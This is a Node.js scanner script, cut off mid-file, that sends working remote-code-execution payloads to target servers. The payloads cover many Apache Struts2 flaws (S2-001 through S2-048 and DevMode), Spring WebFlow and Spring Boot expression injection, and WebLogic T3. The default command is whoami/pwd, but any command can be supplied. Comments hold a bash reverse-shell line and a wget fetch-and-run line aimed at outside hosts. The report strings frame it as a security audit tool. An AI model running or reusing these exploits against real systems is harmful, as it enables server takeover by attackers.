var szMyName = 'M.T.X._2017-06-08 1.0',
	program     = require('commander'),
	request = require('request'),
	urlObj = require('url'),
	child_process = require("child_process"),
	net = require('net'),
	crypto = require('crypto'),
	path        = require("path"),
	fs = require('fs'),
	g_szUrl = "",bReDo = false, szLstLocation = "",
	g_oRst = {},
	timeout = 5000,
	g_nPool = 100,
	iconv = require("iconv-lite"),
	bRunHost = false,
	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
	aHS = "X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/)
		;
process.title = '巅狼团队_M.T.X.V 2.0'
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";
var fnError = function(e)
{
	// console.log(e)
};
process.on('uncaughtException', fnError);
process.on('unhandledRejection', fnError);


program.version(szMyName)
	.option('-u, --url [value]', 'check url, no default')
	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default')
	.option('-t, --t3 [value]', 'check weblogic t3,default false，可以指定列表进行检测')
	.option('-i, --install', 'install node modules,run: npm install')
	.option('-v, --verbose', 'show logs')
	.option('-w, --struts2 [value]', 'struts2 type,eg: 045')
	.option('-C, --cmd [value]', 'cmd type,eg: "ping -c 3 www.baidu.com"')
	.option('-o, --timeout', 'default ' + timeout)
	.option('-l, --pool', 'default ' + g_nPool)
	.option('-r, --test', 'test')
	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
	.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
	.parse(process.argv);
timeout = program.timeout || timeout;
g_nPool = program.pool || g_nPool;

if(program.cmd && "string" == typeof program.cmd)
{
	g_szCmdW = g_szCmd = program.cmd;
}

// 检查对象
var a = process.argv.splice(2),g_postData = "%{(#nike='multipart/form-data')"
		// s-045不允许下面的代码
		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ".(#_memberAccess['excludedClasses']=true)"
		+ ".(#rplc=true)"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
		+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
		+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		// response.addHeader
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+ ".(#ros=(#response.getOutputStream()))"

	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		// + ".(@org.apache.commons.io.IOUtils@copy(new java.io.InputStreamReader(#process.getInputStream(),#iswin?'gbk':'UTF-8'),#ros))"
		 + ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush()).(#ros.close())}";

g_szUrl = program.url || 1 == a.length && a[0] || "";
if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
	g_szUrl += "/";

if(-1 == g_szUrl.indexOf("http"))
	g_szUrl = "http://" + g_szUrl;

// 安装包
if(program.install)
{
	var aI,szT = fs.readFileSync(__filename),
		r2 = /require\(['"]([^'"]+)['"]\)/gmi,szPkg = __dirname + "/package.json",
		oPkg = JSON.parse(fs.readFileSync(szPkg));
	while(aI = r2.exec(szT))
	{
		oPkg["dependencies"][aI[1]] = "";
		console.log(aI[1] + " = " + oPkg["dependencies"][aI[1]]);
	}
	fs.writeFileSync(szPkg,JSON.stringify(oPkg));
	process.exit(0);
}

// 代理设置
if(program.proxy)
{
	request = request.defaults({'proxy': program.proxy});
	var a1 = program.proxy.split(/:\/\//g)
	if(a1 && 2 == a1.length)
	{
		process.env[a1[0].toLowerCase() + "_proxy"] = program.proxy;
		try{require('global-tunnel').initialize()}catch(e){}
	}
}
function fnOptHeader(o)
{
	var k = {followAllRedirects:false,followRedirect:false,"timeout":timeout,pool: {maxSockets: g_nPool}};
	for(var i  in k)
	{
		o[i] = k[i];
	}
	return o;
}

var g_host2Ip = {};
// tomcat测试
// https://www.exploit-db.com/exploits/41783/
// /?{{%25}}cake\=1
// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
// 基于socket发送数据
function fnSocket(h,p,szSend,fnCbk)
{
	var s, rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi;

	if(h && !(s = rIp.exec(h)))
	{
		if(g_host2Ip[h])h = g_host2Ip[h];
		else
		{
			s = child_process.execSync("host " + h);
			s = rIp.exec(s);
			if(s)g_host2Ip[h] = s[0],h = s[0];

		}
	}
	try{
		const client = net.connect(fnOptHeader({"port": p,"host":h}), () => 
		{
		  client.write(szSend);
		});
		client.on('data', (data) => 
		{
			fnCbk(data);
			client.end();
		});
		client.on('end', () =>{});
	}catch(e){}
}

// check weblogic T3
function checkWeblogicT3(h,p)
{
	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
	p || (p = 80);
	fnLog(s);
	fnSocket(h,p,s,function(data)
	{
		if(data)
		{
			g_oRst.t3 = {r:data.toString().trim(),des:"建议关闭T3协议，或者限定特定ip可访问"};
			fnLog(g_oRst.t3.r);
			console.log("found T3 " + h + ":" + p);
		}
		/*
		var d = data && data.toString().trim() || "", 
			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
		console.log(d);
		console.log(re.test(d));*/
	});
}

// checkWeblogicT3("192.168.18.89",7001);
if(program.t3)
{
	if("string" == typeof program.t3)
	{
		var a = fs.readFileSync(program.t3).toString().trim().split("\n"), p;
		for(var k in a)
		{
			a[k] = a[k].replace(/(^.*?\/\/)|(\/.*?$)|(\s*)/gmi,'');
			p = a[k].split(":");
			p[1] = p[1] || "80";
			checkWeblogicT3(p[0], p[1]);
		}
	}
	else
	{
		var rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi, r1 = rIp.exec(g_szUrl);
		if(!r1)
		{
			var s = g_szUrl.replace(/([https]*?:\/\/)|(\/.*?$)/gmi,'').split(":");
			r1 = ['',s[0], 1 == s.length ? 80: s[1]];
		}
		// console.log(r1);
		checkWeblogicT3(r1[1],r1[2]);
	};

}

// 解析裸头信息
function fnParseHttpHd(s,fnCbk)
{
	var a = s.trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[aT[0].toLowerCase().trim()] = aT[1].trim();
	}
	if(fnCbk)fnCbk(obj);
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var uO = urlObj.parse(url), ss = "I.am.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		// checkWeblogicT3(host,port);

		if(program.t3)fnCheckJavaFx([host,port].join(":"));
		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
				+ szMyName 
				+ ') ' + g_szUa + ' MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
		+ '\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";
			
			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){fnLog(e)}
}

// 单个方法测试
function fnTest(s)
{
	request(
	    fnOptHeader({ method: s ||'PUT'
	    ,"uri": g_szUrl//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    })
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			// url
	      			szLstLocation = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "确定不需要该安全头信息 " + aHS[k];
	      		}
	      	}
	      	g_oRst.safeHeader.des = "作为安全要求、规范要求，建议加上缺失的头信息";
	    }
	  );
}

function getIps(ip)
{
	var re = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/gmi.exec(ip);
	if(re && 0 < re.length)ip = re[1];
	request.get("http://ipinfo.io/" + ip,function(e,r,b)
	{
		try{if(!e)g_oRst["ipinfo"] = JSON.parse(b);}catch(e1){}
	});

}

// /usr/local/apache-tomcat-7.0.64-2/webapps
// http://192.168.10.216:8082/s2-046/
function doStruts2_046(url)
{
	// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
	var s = ("%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" +
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}");
	try{
		var uO = urlObj.parse(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		
		// Expect: \r\n
		var szTmp = '',tNum = new Date().getTime(),
			boundary = '---------------------------11602011' + tNum,
			szTmp2 = '--' + boundary + '\r\nContent-Disposition: form-data; name="foo"; filename="' + s + '\0b"\r\nContent-Type: text/plain\r\n\r\nx\r\n--' + boundary + '--\r\n\r\n';
		fnSocket(host,port,szTmp = 'POST ' + uO.path + '/ HTTP/1.1\r\nHost: ' 
			+ uO.host + '\r\nContent-Length: ' + (szTmp2.length + 4) + '\r\nUser-Agent: ' + g_szUa + '\r\nContent-Type: multipart/form-data; boundary=' + boundary 
		+ '\r\nConnection: close\r\n\r\n' + szTmp2,
			function(data)
		{
			var d = (data && data.toString().trim() || "").toString("utf8");
			// console.log(szTmp)
			// console.log(d)
    		fnDoBody(d,"s2-046",url);
			
		});
	}catch(e){fnLog(e);}
}


/*
Spring WebFlow 远程代码执行漏洞(CVE-2017-4971)
&_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.2.140:8000/1")
&_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/1")
&_(new+java.lang.ProcessBuilder("touch /tmp/success2")).start()=test
*/
function DoWebFlow(url)
{
	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"SpringWebFlow-CVE-2017-4971",url);
    });
}

/*
Spring Boot whitelabel-error-page SpEl 代码执行漏洞(gh-4763)
payload=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))}.
*/
function DoSpringBoot(url)
{
	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"SpringBoot-gh-4763",url);
    });
}

// s2-033,s2-037
// s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_037(url)
{
	var szOldUrl = url;
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
	request(fnOptHeader({method: 'POST',uri: url}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-037",szOldUrl);
    });
}
// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
function doStruts2_033(url)
{
	var szOldUrl = url;
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
	request(fnOptHeader({method: 'POST',uri: url}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-033",szOldUrl);
    });
}
   
// integration/saveGangster.action
function doStruts2_048(url,fnCbk)
{
	var szOldUrl = url;
	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
	this.name = this.name || "name";

	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
		"(#_memberAccess?(#_memberAccess=#dm):" + 
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
	 	".(#ognlUtil.getExcludedClasses().clear())" + 
		".(#context.setMemberAccess(#dm))))" + 
		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
		".(#process=#p.start())"
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+".(#ros=#response.getOutputStream())" + 
		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    var data = {"age": 20};
    data[this.name] = g_postData || payload;
    request(fnOptHeader({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-048",szOldUrl);
    	// console.log(e || b || r);
    });
}

function myLog(a)
{
	// console.log(String(a.callee))
	var c = a.callee.caller;
	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
	if(a.callee.caller)
	{
		// console.log(a.callee.caller.arguments.toString());
		a = a.callee.caller.arguments;
		if(0 < a.length)myLog(a);
	}
}
g_oRst.struts2 || (g_oRst.struts2 = {});

/*
获取表单数据，并推进表单字段测试
*/
var g_oForm = {};
function fnDoForm(s,url)
{
	if(s && url)
	{
		var re = /<input .*?name=['"]*([^'"]+)['"]*\s[^>]*>/gmi;
		while(a = re.exec(s))
		{
			var oT = g_oForm[url] || (g_oForm[url] = {});
			if(!oT[a[1]])
			{
				oT[a[1]] = 1;
				// console.log(url + "  " + a[1]);
				fnTestStruts2(url, {name:a[1]});
			}
		}
	}
}

function fnDoBody(body,t,url,rep)
{
	// win 字符集处理
	if(body && -1 < String(body).indexOf("[^\/]administrator"))
	{
		 try{body = iconv.decode(body,"cp936").toString("utf8");}catch(e){}
		 // console.log(body);
	}
	if(body)body = body.toString();
	fnDoForm(body,url);
	if( -1 < String(body||"").indexOf(".(#ros.flush()") ||
		-1 < String(body||"").indexOf("org.apache.commons.io.IOUtils"))return;
		

	var e = fnGetErrMsg(body);
	if(e)g_oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
	// console.log(t);
	var oCa = arguments.callee.caller.arguments;
	if(!rep)rep = oCa[1];
	// error msg
	if(oCa[0])fnLog(oCa[0]);
	var repT = oCa[1] || {};
	
	// safegene
	if(repT && repT.headers && repT.headers['safegene_msg'])
		fnLog(decodeURIComponent(repT.headers['safegene_msg']));


	if(repT && repT.headers && repT.headers["struts2"])
		g_oRst.struts2[t] = "发现struts2高危漏洞" + t + "，请尽快升级";

	body||(body = "");
	if(!body)
	{
		// myLog(arguments);
	}

	if(!body)return;
	body = body.toString("utf8").trim();
	var rg1 = /(__VIEWSTATEGENERATOR)|(java\.io\.InputStreamReader)|(org\.apache\.struts2\.ServletActionContext)|(\.getWriter)/gmi;
	if(rg1.test(body) || -1 < body.indexOf("pwd%3a") || -1 < body.indexOf("echo+whoami"))return;

	//console.log(body.indexOf("echo+whoami"));return;
	g_oRst.config || (g_oRst.config = {});
	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
	{
		g_oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
	}
	// at 
	if(!g_oRst.config["dev"])
	{
		var re = /Exception\s+at ([^\(]+)\(/gmi;
			re = re.exec(body);
		if(re && 0 < re.length)
		{
			g_oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
		}
	}
	if(!g_oRst.config["x-powered-by"] && rep && rep.headers)
	{
		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
		{
			g_oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
		}
	}
	if(!g_oRst.config["server"] && rep && rep.headers)
	{
		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
		{
			g_oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
		}
	}

	var nwhoami = 0;
	if(t && program.cmd && -1 == body.indexOf("<body"))console.log(t + "\n" + body);
	if(!body || -1 == (nwhoami = body.indexOf("whoami")))return;
	
	//if(-1 < t.indexOf("s2-001"))console.log(body)
	body = body.substr(nwhoami);
	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
	if(-1 < i)body = body.substr(0,i);
	// if("s2-045" == t)console.log(body)
	// if(-1 < t.indexOf("s2-053"))console.log(body);
	// 误报
	if(-1 < body.indexOf("<body") && -1 == body.indexOf("whoami:") && -1 == body.indexOf("pwd:"))
	{
		console.log(body);
		return;
	}
	console.log("发现高危漏洞("+ (rep && rep.request && rep.request.uri &&rep.request.uri.href || "") +"):\n" + t);
	
	if(0 < i) body = body.substr(0, i).trim().replace(/\u0000/gmi,'');
	// console.log(body);
	var oT = g_oRst.struts2,s1 = String(body).split(/\n/);
	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
	if(-1 < body.indexOf("root") && !oT["root"])
		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	if(s1[0] && 50 > s1[0].length && !oT["user"])
		oT["user"] = "当前中间件启动的用户：" + String(-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
	var szMdPath = (3 < s1.length ? s1[3] : "").trim();
	if(1 < s1.length && !oT["CurDir"] && szMdPath)
		oT["CurDir"] = {des:"当前中间件目录","path":szMdPath};
}

function doStruts2_045(url, fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	//  && cat #curPath/WEB-INF/jdbc.propertis
	// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
	request(fnOptHeader({method: 'POST',uri: url
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	// encodeURIComponent不能编码 2017-07-18
	    	"Content-Type":g_postData
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
	  			// console.log(body);
	  			fnDoBody(body,"s2-045",url);
	  		}
	    }
	  );
}

// S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_DevMode(url)
{
	// debug=browser&object=
	// debug=command&expression=
	request(fnOptHeader({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-DevMode",url);
    });
}
// s2-007 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '

function fnNotEnd(url)
{
	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
	return url;
}

// http://192.168.10.216:8088/S2-001/login.action
// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
function doStruts2_001(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	this.name = this.name || "username";
	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
		+ ',#wt=#f.getWriter()'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#wt.flush()'
		+',#wt.close()}');

	request(({method: 'POST',uri: url 
		,body:this.name + "=" + encodeURIComponent(s) + "&password="
		,headers:
	    {
	    	"user-agent": g_szUa,
	    	"content-type":"application/x-www-form-urlencoded"
	    }}),
    	function(e,r,b)
    {
    	// console.log(b);
    	fnDoBody(b,"s2-001,s2-012",szOldUrl);
    });
}

function doStruts2_005(url, fnCbk)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
		+ ',#wt=#f.getWriter()'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		// + ',#wt.flush()'
		// +',#wt.close()'
		+'}');
	var ss = s.replace(/#/gmi, "\u0023");
	ss = encodeURIComponent(ss);
	request(fnOptHeader({method: 'GET',uri: url + "?" + ss + "=1"
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-005",szOldUrl);
	  		}
	    }
	  );
	ss = g_postData.replace(/#/gmi, "\\43");
	request(fnOptHeader({method: 'GET',uri: url + "?s=" + ss
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-005",szOldUrl);
	  		}
	    }
	  );
}

function doStruts2_019(url, fnCbk,bW)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	// (@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))
	var s = ('#iswin=' + !!bW + ',#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#wt.flush()'
		+',#wt.close()');
	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" 
		+ encodeURIComponent(s)
		})
	  , function (error, response, body){
	  	// console.log(error||body);
	  		if(body)
	  		{
	  			fnDoBody(body.replace(/\u0000/gmi,''),"s2-019",szOldUrl);
	  		}
	    }
	  );
	if(!bW)doStruts2_019(url,null,true);
}

/*
